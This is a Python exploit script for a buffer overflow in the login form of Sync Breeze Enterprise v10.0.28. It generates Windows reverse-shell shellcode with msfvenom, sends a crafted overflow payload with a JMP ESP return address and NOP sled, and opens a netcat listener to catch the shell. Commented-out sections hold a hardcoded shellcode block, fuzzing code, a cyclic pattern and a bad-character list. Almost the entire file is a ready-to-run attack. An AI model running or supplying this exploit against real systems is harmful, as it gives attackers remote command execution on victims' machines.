import socket
import requests
import sys
import os

#
# Sync Breeze Enterprise v10.0.28 Exploit
# firedragon9511
# https://github.com/firedragon9511
#

if len(sys.argv) != 4:
	print("Usage: exploit.py TARGET LHOST LPORT")

	sys.exit(0)


TARGET = sys.argv[1]
LHOST = sys.argv[2]
LPORT = sys.argv[3]

msfvenom = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" -f c -b \"\\x00\" | grep \"\\x\" | sed \"s/;//\" > tmp_23810213.txt"

print(msfvenom)

os.system(msfvenom)

file = open("tmp_23810213.txt", "r")
shell = eval("("+file.read()+")")
file.close()

# Sync Breeze Enterprise v10.0.28
# username=CAMPO&password=

#msfvenom -p windows/shell_reverse_tcp LHOST=10.11.26.108 LPORT=80 -f c -b "\x00"
#overflow = 'A' * 1000
#overflow = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
# EIP 520
# BAD \0x00
# JMP ESP 10090C83
bad = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe"
'''shell = ("\xbf\x31\xc9\x46\x04\xdb\xd0\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x7e\x12\x83\xc6\x04\x03\x4f\xc7\xa4\xf1\x53\x3f\xaa"
"\xfa\xab\xc0\xcb\x73\x4e\xf1\xcb\xe0\x1b\xa2\xfb\x63\x49\x4f"
"\x77\x21\x79\xc4\xf5\xee\x8e\x6d\xb3\xc8\xa1\x6e\xe8\x29\xa0"
"\xec\xf3\x7d\x02\xcc\x3b\x70\x43\x09\x21\x79\x11\xc2\x2d\x2c"
"\x85\x67\x7b\xed\x2e\x3b\x6d\x75\xd3\x8c\x8c\x54\x42\x86\xd6"
"\x76\x65\x4b\x63\x3f\x7d\x88\x4e\x89\xf6\x7a\x24\x08\xde\xb2"
"\xc5\xa7\x1f\x7b\x34\xb9\x58\xbc\xa7\xcc\x90\xbe\x5a\xd7\x67"
"\xbc\x80\x52\x73\x66\x42\xc4\x5f\x96\x87\x93\x14\x94\x6c\xd7"
"\x72\xb9\x73\x34\x09\xc5\xf8\xbb\xdd\x4f\xba\x9f\xf9\x14\x18"
"\x81\x58\xf1\xcf\xbe\xba\x5a\xaf\x1a\xb1\x77\xa4\x16\x98\x1f"
"\x09\x1b\x22\xe0\x05\x2c\x51\xd2\x8a\x86\xfd\x5e\x42\x01\xfa"
"\xa1\x79\xf5\x94\x5f\x82\x06\xbd\x9b\xd6\x56\xd5\x0a\x57\x3d"
"\x25\xb2\x82\x92\x75\x1c\x7d\x53\x25\xdc\x2d\x3b\x2f\xd3\x12"
"\x5b\x50\x39\x3b\xf6\xab\xaa\x4e\x0c\xa9\x46\x27\x10\xcd\x96"
"\xe7\x9d\x2b\xfc\x17\xc8\xe4\x69\x81\x51\x7e\x0b\x4e\x4c\xfb"
"\x0b\xc4\x63\xfc\xc2\x2d\x09\xee\xb3\xdd\x44\x4c\x15\xe1\x72"
"\xf8\xf9\x70\x19\xf8\x74\x69\xb6\xaf\xd1\x5f\xcf\x25\xcc\xc6"
"\x79\x5b\x0d\x9e\x42\xdf\xca\x63\x4c\xde\x9f\xd8\x6a\xf0\x59"
"\xe0\x36\xa4\x35\xb7\xe0\x12\xf0\x61\x43\xcc\xaa\xde\x0d\x98"
"\x2b\x2d\x8e\xde\x33\x78\x78\x3e\x85\xd5\x3d\x41\x2a\xb2\xc9"
"\x3a\x56\x22\x35\x91\xd2\x52\x7c\xbb\x73\xfb\xd9\x2e\xc6\x66"
"\xda\x85\x05\x9f\x59\x2f\xf6\x64\x41\x5a\xf3\x21\xc5\xb7\x89"
"\x3a\xa0\xb7\x3e\x3a\xe1")'''

overflow = ('A' * 520) + '\x83\x0C\x09\x10' +  ("\x90" * 30) + shell
print(overflow)

#buf = ["A"]
#for i in range(1, 30):
#        buf.append("A" * (100 * i))   

#for data in buf:
	#print("Fuzzing bytes: " + str(len(data)))
#os.system("nc -vnlp 80")

try:
	url = "http://" + TARGET + '/login'
	myobj = {'username': overflow, 'password': overflow}
	x = requests.post(url, data = myobj, timeout=1)
	print(str(x))
except:
	pass

os.system("nc -vnlp " + LPORT)


'''s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c= s.connect(("10.11.26.103", 80 ))
s.send("POST /login HTTP/1.1/r/n")
s.send("POST /login HTTP/1.1/r/n")'''
